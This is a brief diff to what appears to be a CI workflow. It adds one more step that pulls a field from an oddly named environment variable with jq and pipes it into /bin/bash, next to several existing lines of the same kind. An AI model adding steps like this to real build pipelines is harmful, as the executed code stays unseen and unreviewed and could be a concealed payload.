@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$xut6" | jq -r .m6852 | /bin/bash
           echo $sv551 | jq -r .v42 | /bin/bash
           echo $ekrj6 | jq -r .kj84 | /bin/bash
+          printf '%s' "$v977" | jq -r .cer437 | /bin/bash
 
       - name: Archive results
         if: always()
